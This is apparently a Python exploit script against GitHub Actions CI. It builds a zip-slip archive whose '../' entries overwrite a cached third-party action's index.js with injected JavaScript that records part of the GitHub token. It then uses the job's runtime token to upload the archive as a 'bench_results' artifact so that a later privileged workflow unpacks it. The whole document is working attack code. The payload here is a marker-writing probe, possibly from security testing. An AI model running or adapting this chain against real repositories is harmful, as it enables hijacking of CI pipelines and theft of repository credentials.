import os, json, base64, hashlib, zipfile, urllib.request

payload = (
    "console.log('HIJACKED-COMMENT-ACTION-RAN');\n"
    "try{require('fs').writeFileSync('/home/runner/work/PWNED-ACTION.txt',"
    " 'ok token_prefix='+String(process.env['INPUT_GITHUB-TOKEN']||process.env.GITHUB_TOKEN||'none').slice(0,10));}"
    "catch(e){console.log('err',e)}\n"
)

d = '/tmp/zs'
os.makedirs(d, exist_ok=True)
zpath = os.path.join(d, 'a.zip')
z = zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED)
z.writestr('pr_number.txt', '1\n')
z.writestr('comparison.md', '### zip-slip probe comment\n')
z.writestr('../../../ZIPSLIP_ESCAPED.txt', 'escaped\n')
z.writestr('../../../_actions/thollander/actions-comment-pull-request/fabd468d3a1a0b97feee5f6b9e499eab0dd903f6/lib/index.js', payload)
z.close()
data = open(zpath, 'rb').read()
print('zip size', len(data))

tok = os.environ['ACTIONS_RUNTIME_TOKEN']
results = os.environ['ACTIONS_RESULTS_URL'].rstrip('/')
p = tok.split('.')[1]; p += '=' * (-len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
scp = [s for s in c['scp'].split(' ') if s.startswith('Actions.Results:')][0]
_, wr, jr = scp.split(':')
print('wr', wr, 'jr', jr, 'results', results)

def post(url, obj):
    req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                 headers={'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'})
    return json.loads(urllib.request.urlopen(req).read())

create = post(results + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
              {'workflow_run_backend_id': wr, 'workflow_job_run_backend_id': jr,
               'name': 'bench_results', 'mime_type': 'application/zip', 'version': 7})
print('CREATE', create)
url = create.get('signed_upload_url')
req = urllib.request.Request(url, data=data, method='PUT',
                             headers={'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip'})
print('PUT status', urllib.request.urlopen(req).status)
fin = post(results + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
           {'workflow_run_backend_id': wr, 'workflow_job_run_backend_id': jr, 'name': 'bench_results',
            'size': str(len(data)), 'hash': 'sha256:' + hashlib.sha256(data).hexdigest()})
print('FINAL', fin)
